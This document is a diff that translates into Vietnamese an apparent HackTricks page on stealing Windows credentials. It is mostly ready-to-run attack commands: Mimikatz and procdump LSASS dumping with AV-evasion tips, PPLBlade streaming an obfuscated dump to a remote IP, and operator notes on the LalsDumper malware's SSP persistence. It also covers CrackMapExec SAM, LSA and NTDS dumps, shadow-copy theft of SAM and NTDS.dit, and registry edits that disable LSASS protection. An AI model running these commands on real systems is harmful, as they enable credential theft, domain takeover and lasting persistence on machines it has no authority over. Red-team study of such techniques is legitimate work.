@@ -1,8 +1,8 @@
-# Stealing Windows Credentials
+# Đánh cắp thông tin xác thực Windows
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Credentials Mimikatz
+## Thông tin xác thực Mimikatz
 
 ```bash
 #Elevate Privileges to extract the credentials
@@ -18,7 +18,7 @@ lsadump::sam
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
 
-**Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
+**Tìm hiểu những việc khác mà Mimikatz có thể làm trên** [**trang này**](credentials-mimikatz.md)**.**
 
 ### Invoke-Mimikatz
 
@@ -28,11 +28,11 @@ Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
 
-[**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
+[**Tìm hiểu một số biện pháp bảo vệ thông tin xác thực có thể áp dụng tại đây.**](credentials-protections.md) **Các biện pháp bảo vệ này có thể ngăn Mimikatz trích xuất một số thông tin xác thực.**
 
 ## Credentials with Meterpreter
 
-Use the [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **that** I have created to **search for passwords and hashes** inside the victim.
+Sử dụng [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **mà tôi đã tạo để** **tìm kiếm mật khẩu và hash** bên trong máy nạn nhân.
 
 ```bash
 #Credentials from SAM
@@ -51,14 +51,14 @@ mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
 
-## Bypassing AV
+## Vượt qua AV
 
 ### Procdump + Mimikatz
 
-As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.\
-You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
+Vì **Procdump của** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**là một công cụ hợp pháp của Microsoft**, Defender không phát hiện công cụ này.\
+Bạn có thể dùng công cụ này để **dump tiến trình lsass**, **tải dump xuống** và **trích xuất** **thông tin xác thực cục bộ** từ dump.
 
-You could also use [SharpDump](https://github.com/GhostPack/SharpDump).
+Bạn cũng có thể dùng [SharpDump](https://github.com/GhostPack/SharpDump).
 
 ```bash:Dump lsass
 #Local
@@ -77,113 +77,113 @@ mimikatz # sekurlsa::minidump lsass.dmp
 mimikatz # sekurlsa::logonPasswords
 ```
 
-This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+Quá trình này được thực hiện tự động bằng [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead of** the **name lsass.exe.**
+**Lưu ý**: Một số **AV** có thể **phát hiện** việc sử dụng **procdump.exe để dump lsass.exe** là **độc hại**, vì chúng **phát hiện** chuỗi **"procdump.exe" và "lsass.exe"**. Vì vậy, cách **kín đáo hơn** là truyền **PID** của lsass.exe làm **đối số** cho procdump **thay vì** tên **lsass.exe.**
 
-### Dumping lsass with **comsvcs.dll**
+### Dump lsass bằng **comsvcs.dll**
 
-A DLL named **comsvcs.dll** found in `C:\Windows\System32` is responsible for **dumping process memory** in the event of a crash. This DLL includes a **function** named **`MiniDumpW`**, designed to be invoked using `rundll32.exe`.\
-It is irrelevant to use the first two arguments, but the third one is divided into three components. The process ID to be dumped constitutes the first component, the dump file location represents the second, and the third component is strictly the word **full**. No alternative options exist.\
-Upon parsing these three components, the DLL is engaged in creating the dump file and transferring the specified process's memory into this file.\
-Utilization of the **comsvcs.dll** is feasible for dumping the lsass process, thereby eliminating the need to upload and execute procdump. This method is described in detail at [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>
+Một DLL có tên **comsvcs.dll**, nằm trong `C:\Windows\System32`, chịu trách nhiệm **dump bộ nhớ tiến trình** khi xảy ra sự cố. DLL này có **hàm** tên **`MiniDumpW`**, được thiết kế để gọi bằng `rundll32.exe`.\
+Hai đối số đầu tiên không quan trọng, nhưng đối số thứ ba được chia thành ba thành phần. ID tiến trình cần dump là thành phần thứ nhất, vị trí file dump là thành phần thứ hai, còn thành phần thứ ba bắt buộc phải là từ **full**. Không có tùy chọn thay thế nào.\
+Sau khi phân tích ba thành phần này, DLL sẽ tạo file dump và chuyển bộ nhớ của tiến trình được chỉ định vào file đó.\
+Có thể sử dụng **comsvcs.dll** để dump tiến trình lsass, nhờ đó không cần tải lên và thực thi procdump. Phương pháp này được mô tả chi tiết tại [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>
 
-The following command is employed for execution:
+Lệnh sau được dùng để thực thi:
 
 ```bash
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
 
-**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+**Bạn có thể tự động hóa quy trình này bằng** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
 
-### **Dumping lsass with Task Manager**
+### **Dump lsass bằng Task Manager**
 
-1. Right click on the Task Bar and click on Task Manager
-2. Click on More details
-3. Search for "Local Security Authority Process" process in the Processes tab
-4. Right click on "Local Security Authority Process" process and click on "Create dump file".
+1. Nhấp chuột phải vào Task Bar rồi nhấp vào Task Manager
+2. Nhấp vào More details
+3. Tìm tiến trình "Local Security Authority Process" trong tab Processes
+4. Nhấp chuột phải vào tiến trình "Local Security Authority Process" rồi nhấp vào "Create dump file".
 
-### Dumping lsass with procdump
+### Dump lsass bằng procdump
 
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Microsoft signed binary which is a part of [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) là một binary có chữ ký của Microsoft, thuộc bộ [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
 
-An already-existing full-system crash dump, or a compressed copy in an accessible user folder, may retain credential material for offline analysis. Filenames such as `MEMORY.DMP` and `MEMORY.7z` are only review leads: verify provenance and access, and do not assume they contain usable or current credentials.
+Một crash dump toàn hệ thống đã có sẵn, hoặc bản sao được nén trong thư mục người dùng có thể truy cập, có thể lưu giữ dữ liệu thông tin xác thực để phân tích ngoại tuyến. Các tên tệp như `MEMORY.DMP` và `MEMORY.7z` chỉ là đầu mối cần kiểm tra: hãy xác minh nguồn gốc và quyền truy cập, đồng thời không mặc định rằng chúng chứa thông tin xác thực còn sử dụng được hoặc hiện hành.
 
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
 
-## Dumpin lsass with PPLBlade
+## Dumping lsass với PPLBlade
 
-[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is a Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.
+[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) là công cụ dump Protected Process, hỗ trợ làm rối memory dump và chuyển tệp đến các workstation từ xa mà không ghi tệp xuống đĩa.
 
-**Key functionalities**:
+**Chức năng chính**:
 
-1. Bypassing PPL protection
-2. Obfuscating memory dump files to evade Defender signature-based detection mechanisms
-3. Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)
+1. Bypass cơ chế bảo vệ PPL
+2. Làm rối các tệp memory dump để né cơ chế phát hiện dựa trên signature của Defender
+3. Upload memory dump bằng phương thức RAW và SMB mà không ghi tệp xuống đĩa (fileless dump)
 
 ```bash
 PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
 ```
 
-## LalsDumper – SSP-based LSASS dumping without MiniDumpWriteDump
+## LalsDumper – Dump LSASS dựa trên SSP mà không cần MiniDumpWriteDump
 
-Ink Dragon ships a three-stage dumper dubbed **LalsDumper** that never calls `MiniDumpWriteDump`, so EDR hooks on that API never fire:<sup>[[3]](#references)</sup>
+Ink Dragon phát hành một công cụ dump gồm ba giai đoạn có tên **LalsDumper**. Công cụ này không bao giờ gọi `MiniDumpWriteDump`, nên các hook EDR trên API đó sẽ không bị kích hoạt:<sup>[[3]](#references)</sup>
 
-1. **Stage 1 loader (`lals.exe`)** – searches `fdp.dll` for a placeholder consisting of 32 lower-case `d` characters, overwrites it with the absolute path to `rtu.txt`, saves the patched DLL as `nfdp.dll`, and calls `AddSecurityPackageA("nfdp","fdp")`. This forces **LSASS** to load the malicious DLL as a new Security Support Provider (SSP).
-2. **Stage 2 inside LSASS** – when LSASS loads `nfdp.dll`, the DLL reads `rtu.txt`, XORs each byte with `0x20`, and maps the decoded blob into memory before transferring execution.
-3. **Stage 3 dumper** – the mapped payload re-implements MiniDump logic using **direct syscalls** resolved from hashed API names (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). A dedicated export named `Tom` opens `%TEMP%\<pid>.ddt`, streams a compressed LSASS dump into the file, and closes the handle so exfiltration can happen later.
+1. **Stage 1 loader (`lals.exe`)** – tìm trong `fdp.dll` một placeholder gồm 32 ký tự `d` viết thường, thay thế nó bằng đường dẫn tuyệt đối đến `rtu.txt`, lưu DLL đã chỉnh sửa thành `nfdp.dll`, rồi gọi `AddSecurityPackageA("nfdp","fdp")`. Thao tác này buộc **LSASS** tải DLL độc hại dưới dạng Security Support Provider (SSP) mới.
+2. **Stage 2 bên trong LSASS** – khi LSASS tải `nfdp.dll`, DLL đọc `rtu.txt`, XOR từng byte với `0x20`, rồi ánh xạ blob đã giải mã vào bộ nhớ trước khi chuyển quyền thực thi.
+3. **Stage 3 dumper** – payload đã ánh xạ tái triển khai logic MiniDump bằng **direct syscall**, được phân giải từ các tên API đã băm (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Một export chuyên dụng tên là `Tom` mở `%TEMP%\<pid>.ddt`, ghi dump LSASS đã nén vào tệp, rồi đóng handle để có thể exfiltration sau đó.
 
-Operator notes:
+Ghi chú vận hành:
 
-* Keep `lals.exe`, `fdp.dll`, `nfdp.dll`, and `rtu.txt` in the same directory. Stage 1 rewrites the hard-coded placeholder with the absolute path to `rtu.txt`, so splitting them breaks the chain.
-* Registration happens by appending `nfdp` to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. You can seed that value yourself to make LSASS reload the SSP every boot.
-* `%TEMP%\*.ddt` files are compressed dumps. Decompress locally, then feed them to Mimikatz/Volatility for credential extraction.
-* Running `lals.exe` requires admin/SeTcb rights so `AddSecurityPackageA` succeeds; once the call returns, LSASS transparently loads the rogue SSP and executes Stage 2.
-* Removing the DLL from disk does not evict it from LSASS. Either delete the registry entry and restart LSASS (reboot) or leave it for long-term persistence.
+* Đặt `lals.exe`, `fdp.dll`, `nfdp.dll` và `rtu.txt` trong cùng một thư mục. Stage 1 thay placeholder được hard-code bằng đường dẫn tuyệt đối đến `rtu.txt`, nên để chúng ở các thư mục riêng sẽ làm đứt chuỗi.
+* Việc đăng ký được thực hiện bằng cách thêm `nfdp` vào `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Bạn có thể tự tạo giá trị này để LSASS tải lại SSP mỗi lần khởi động.
+* Các tệp `%TEMP%\*.ddt` là dump đã nén. Giải nén cục bộ, sau đó đưa chúng vào Mimikatz/Volatility để trích xuất thông tin xác thực.
+* Cần quyền admin/SeTcb để chạy `lals.exe` và giúp `AddSecurityPackageA` thành công; khi lệnh gọi trả về, LSASS sẽ tự động tải SSP giả mạo và thực thi Stage 2.
+* Xóa DLL khỏi ổ đĩa không gỡ nó khỏi LSASS. Hãy xóa mục registry rồi khởi động lại LSASS (reboot), hoặc giữ nguyên để duy trì persistence lâu dài.
 
 ## CrackMapExec
 
-### Dump SAM hashes
+### Dump hash SAM
 
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
 
-### Dump LSA secrets
+### Dump bí mật LSA
 
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
 
-### Dump the NTDS.dit from target DC
+### Dump NTDS.dit từ DC mục tiêu
 
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
 
-### Dump the NTDS.dit password history from target DC
+### Dump lịch sử mật khẩu NTDS.dit từ DC mục tiêu
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
 
-### Show the pwdLastSet attribute for each NTDS.dit account
+### Hiển thị thuộc tính pwdLastSet cho mỗi tài khoản trong NTDS.dit
 
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
 
-## Stealing SAM & SYSTEM
+## Đánh cắp SAM & SYSTEM
 
-This files should be **located** in _C:\windows\system32\config\SAM_ and _C:\windows\system32\config\SYSTEM._ But **you cannot just copy them in a regular way** because they protected.
+Các tệp này thường **nằm** trong _C:\windows\system32\config\SAM_ và _C:\windows\system32\config\SYSTEM._ Nhưng **bạn không thể sao chép chúng theo cách thông thường** vì chúng được bảo vệ.
 
-### From Registry
+### Từ Registry
 
-The easiest way to steal those files is to get a copy from the registry:
+Cách dễ nhất để lấy các tệp này là sao chép chúng từ Registry:
 
 ```
 reg save HKLM\sam sam
@@ -191,7 +191,7 @@ reg save HKLM\system system
 reg save HKLM\security security
 ```
 
-**Download** those files to your Kali machine and **extract the hashes** using:
+**Tải xuống** các tệp đó về máy Kali của bạn và **trích xuất các hash** bằng cách:
 
 ```
 samdump2 SYSTEM SAM
@@ -200,11 +200,11 @@ impacket-secretsdump -sam sam -security security -system system LOCAL
 
 ### Volume Shadow Copy
 
-You can perform copy of protected files using this service. You need to be Administrator.
+Bạn có thể sao chép các tệp được bảo vệ bằng dịch vụ này. Bạn cần có quyền Quản trị viên.
 
 #### Using vssadmin
 
-vssadmin binary is only available in Windows Server versions
+Tệp nhị phân vssadmin chỉ có trong các phiên bản Windows Server.
 
 ```bash
 vssadmin create shadow /for=C:
@@ -219,7 +219,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
 
-But you can do the same from **Powershell**. This is an example of **how to copy the SAM file** (the hard drive used is "C:" and its saved to C:\users\Public) but you can use this for copying any protected file:
+Nhưng bạn cũng có thể làm tương tự từ **Powershell**. Đây là ví dụ về **cách sao chép tệp SAM** (ổ đĩa được sử dụng là "C:" và tệp được lưu vào C:\users\Public), nhưng bạn có thể dùng cách này để sao chép bất kỳ tệp được bảo vệ nào:
 
 ```bash
 $service=(Get-Service -name VSS)
@@ -232,95 +232,95 @@ cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
 $volume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 
-Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>
+Code trong sách: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>
 
 ### Invoke-NinjaCopy
 
-Finally, you could also use the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) to make a copy of SAM, SYSTEM and ntds.dit.
+Cuối cùng, bạn cũng có thể sử dụng [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) để tạo bản sao của SAM, SYSTEM và ntds.dit.
 
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
 
-## **Active Directory Credentials - NTDS.dit**
+## **Thông tin xác thực Active Directory - NTDS.dit**
 
-The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.
+Tệp **NTDS.dit** được xem là trái tim của **Active Directory**, chứa dữ liệu quan trọng về các đối tượng người dùng, nhóm và thành viên của chúng. Đây là nơi lưu trữ **password hash** của người dùng trong domain. Tệp này là cơ sở dữ liệu **Extensible Storage Engine (ESE)** và nằm tại **_%SystemRoom%/NTDS/ntds.dit_**.
 
-Within this database, three primary tables are maintained:
+Cơ sở dữ liệu này duy trì ba bảng chính:
 
-- **Data Table**: This table is tasked with storing details about objects like users and groups.
-- **Link Table**: It keeps track of relationships, such as group memberships.
-- **SD Table**: **Security descriptors** for each object are held here, ensuring the security and access control for the stored objects.
+- **Data Table**: Bảng này lưu trữ thông tin chi tiết về các đối tượng như người dùng và nhóm.
+- **Link Table**: Bảng này theo dõi các mối quan hệ, chẳng hạn như thành viên nhóm.
+- **SD Table**: Bảng này lưu trữ **security descriptor** cho từng đối tượng, đảm bảo tính bảo mật và kiểm soát quyền truy cập đối với các đối tượng được lưu trữ.
 
-Christoffer Andersson's database-layer research documents these tables and their version-specific behavior in more detail.<sup>[[8]](#references)</sup>
+Nghiên cứu ở tầng cơ sở dữ liệu của Christoffer Andersson mô tả chi tiết hơn về các bảng này và cách chúng hoạt động khác nhau tùy phiên bản.<sup>[[8]](#references)</sup>
 
-Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).
+Windows sử dụng _Ntdsa.dll_ để tương tác với tệp đó, và _lsass.exe_ sử dụng tệp này. Sau đó, **một phần** của tệp **NTDS.dit** có thể nằm **bên trong bộ nhớ `lsass`** (có thể tìm thấy dữ liệu được truy cập gần đây nhất nhờ cải thiện hiệu năng bằng cách sử dụng **cache**).
 
-#### Decrypting the hashes inside NTDS.dit
+#### Giải mã các hash bên trong NTDS.dit
 
-The hash is encrypted three times:
+Hash được mã hóa ba lần:
 
-1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
-2. Decrypt tha **hash** using **PEK** and **RC4**.
-3. Decrypt the **hash** using **DES**.
+1. Giải mã Password Encryption Key (**PEK**) bằng **BOOTKEY** và **RC4**.
+2. Giải mã **hash** bằng **PEK** và **RC4**.
+3. Giải mã **hash** bằng **DES**.
 
-The **PEK** has the **same value on every domain controller**, but it is **encrypted** inside **NTDS.dit** with the DC-specific **BOOTKEY** from that domain controller's **SYSTEM** hive. Therefore, extracting credentials requires both **NTDS.dit** and **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).
+**PEK** có **cùng giá trị trên mọi domain controller**, nhưng được **mã hóa** bên trong **NTDS.dit** bằng **BOOTKEY** riêng của domain controller đó, lấy từ hive **SYSTEM**. Do đó, để trích xuất thông tin xác thực cần có cả **NTDS.dit** và **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).
 
-### Copying NTDS.dit using Ntdsutil
+### Sao chép NTDS.dit bằng Ntdsutil
 
-Available since Windows Server 2008.
+Có từ Windows Server 2008.
 
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
 
-You could also use the [**volume shadow copy**](#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) trick).
+Bạn cũng có thể dùng thủ thuật [**volume shadow copy**](#stealing-sam-and-system) để sao chép tệp **ntds.dit**. Hãy nhớ rằng bạn cũng sẽ cần một bản sao của **tệp SYSTEM** (một lần nữa, hãy dùng thủ thuật [**dump tệp đó từ registry hoặc dùng volume shadow copy**](#stealing-sam-and-system)).
 
-### **Extracting hashes from NTDS.dit**
+### **Trích xuất hash từ NTDS.dit**
 
-Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
+Sau khi **lấy được** các tệp **NTDS.dit** và **SYSTEM**, bạn có thể dùng các công cụ như _secretsdump.py_ để **trích xuất hash**:
 
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
 
-You can also **extract them automatically** using a valid domain admin user:
+Bạn cũng có thể **trích xuất chúng tự động** bằng tài khoản domain admin hợp lệ:
 
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
 
-For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+Đối với **các tệp NTDS.dit lớn**, nên trích xuất chúng bằng [gosecretsdump](https://github.com/c-sto/gosecretsdump).
 
-Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ or **mimikatz** `lsadump::lsa /inject`
+Cuối cùng, bạn cũng có thể dùng **module metasploit**: _post/windows/gather/credentials/domain_hashdump_ hoặc **mimikatz** `lsadump::lsa /inject`
 
-### **Extracting domain objects from NTDS.dit to an SQLite database**
+### **Trích xuất các đối tượng domain từ NTDS.dit vào cơ sở dữ liệu SQLite**
 
-NTDS objects can be extracted to an SQLite database with [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Not only secrets are extracted but also the entire objects and their attributes for further information extraction when the raw NTDS.dit file is already retrieved.
+Có thể trích xuất các đối tượng NTDS vào cơ sở dữ liệu SQLite bằng [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Công cụ này không chỉ trích xuất secrets mà còn trích xuất toàn bộ các đối tượng và thuộc tính của chúng để tiếp tục thu thập thông tin, khi tệp NTDS.dit thô đã được lấy.
 
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
 
-The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
+Hive `SYSTEM` là tùy chọn nhưng cho phép giải mã secrets (hash NT & LM, thông tin xác thực bổ sung như mật khẩu dạng cleartext, khóa Kerberos hoặc trust, lịch sử mật khẩu NT & LM). Cùng với những thông tin khác, dữ liệu được trích xuất bao gồm: tài khoản người dùng và máy tính cùng với hash của chúng, các cờ UAC, dấu thời gian đăng nhập gần nhất và thay đổi mật khẩu gần nhất, mô tả tài khoản, tên, UPN, SPN, nhóm và tư cách thành viên đệ quy, cây organizational unit và tư cách thành viên, các domain đáng tin cậy cùng với loại, hướng và thuộc tính của trust...
 
 ## Lazagne
 
-Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
+Tải binary từ [đây](https://github.com/AlessandroZ/LaZagne/releases). Bạn có thể dùng binary này để trích xuất thông tin xác thực từ nhiều phần mềm.
 
 ```
 lazagne.exe all
 ```
 
-## Other tools for extracting credentials from SAM and LSASS
+## Các công cụ khác để trích xuất thông tin xác thực từ SAM và LSASS
 
 ### Windows credentials Editor (WCE)
 
-This tool can be used to extract credentials from the memory. Download it from: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+Công cụ này có thể được dùng để trích xuất thông tin xác thực từ bộ nhớ. Tải xuống tại: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Extract credentials from the SAM file
+Trích xuất thông tin xác thực từ tệp SAM
 
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
@@ -329,7 +329,7 @@ fgdump.exe
 
 ### PwDump
 
-Extract credentials from the SAM file
+Trích xuất thông tin xác thực từ tệp SAM
 
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
@@ -339,15 +339,15 @@ type outpwdump
 
 ### PwDump7
 
-Download it from:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) and just **execute it** and the passwords will be extracted.
+Tải xuống từ:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) rồi chỉ cần **thực thi** là mật khẩu sẽ được trích xuất.
 
-## Mining idle RDP sessions and weakening security controls
+## Khai thác các phiên RDP không hoạt động và làm suy yếu các biện pháp kiểm soát bảo mật
 
-Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose techniques are handy for any red-teamer:<sup>[[3]](#references)</sup>
+FinalDraft RAT của Ink Dragon có tasker `DumpRDPHistory` với các kỹ thuật hữu ích cho mọi red-teamer:<sup>[[3]](#references)</sup>
 
-### DumpRDPHistory-style telemetry collection
+### Thu thập telemetry theo kiểu DumpRDPHistory
 
-* **Outbound RDP targets** – parse every user hive at `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Each subkey stores the server name, `UsernameHint`, and the last write timestamp. You can replicate FinalDraft’s logic with PowerShell:
+* **Các mục tiêu RDP đi** – phân tích mọi user hive tại `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Mỗi subkey lưu tên máy chủ, `UsernameHint` và dấu thời gian ghi gần nhất. Bạn có thể tái tạo logic của FinalDraft bằng PowerShell:
 
   ```powershell
   Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
@@ -360,7 +360,7 @@ Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose technique
   }
   ```
 
-* **Inbound RDP evidence** – query the `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` log for Event IDs **21** (successful logon) and **25** (disconnect) to map who administered the box:
+* **Bằng chứng RDP đến** – truy vấn nhật ký `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` để tìm Event ID **21** (đăng nhập thành công) và **25** (ngắt kết nối), nhằm xác định ai đã quản trị máy:
 
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
@@ -368,11 +368,11 @@ Ink Dragon’s FinalDraft RAT includes a `DumpRDPHistory` tasker whose technique
     | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
   ```
 
-Once you know which Domain Admin regularly connects, dump LSASS (with LalsDumper/Mimikatz) while their **disconnected** session still exists. CredSSP + NTLM fallback leaves their verifier and tokens in LSASS, which can then be replayed over SMB/WinRM to grab `NTDS.dit` or stage persistence on domain controllers.
+Khi đã biết Domain Admin nào thường xuyên kết nối, hãy dump LSASS (bằng LalsDumper/Mimikatz) khi phiên **đã ngắt kết nối** của họ vẫn còn tồn tại. CredSSP + NTLM fallback để lại verifier và token của họ trong LSASS; sau đó có thể phát lại chúng qua SMB/WinRM để lấy `NTDS.dit` hoặc thiết lập persistence trên các domain controller.
 
-### Registry downgrades targeted by FinalDraft
+### Các mục registry bị FinalDraft nhắm đến để hạ cấp
 
-The same implant also tampers with several registry keys to make credential theft easier:<sup>[[3]](#references)</sup>
+Implant này cũng can thiệp vào một số khóa registry để việc đánh cắp thông tin xác thực trở nên dễ dàng hơn:<sup>[[3]](#references)</sup>
 
 ```cmd
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
@@ -381,18 +381,18 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t R
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
 ```
 
-* `DisableRestrictedAdmin=1` disables Restricted Admin for inbound RDP; it does **not** enable pass-the-hash through that mode. Setting the value to `0` permits Restricted Admin on the destination, but the client must request `/RestrictedAdmin` or use a policy that requires Restricted Admin.<sup>[[14]](#references)</sup> A hash alone does not grant remote administrator rights; see [RDP authentication prerequisites](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
-* `LocalAccountTokenFilterPolicy=1` disables UAC token filtering so local admins get unrestricted tokens over the network.
-* `DSRMAdminLogonBehavior=2` lets the DSRM administrator log on while the DC is online, giving attackers another built-in high-privilege account.
-* `RunAsPPL=0` removes LSASS PPL protections, making memory access trivial for dumpers such as LalsDumper.
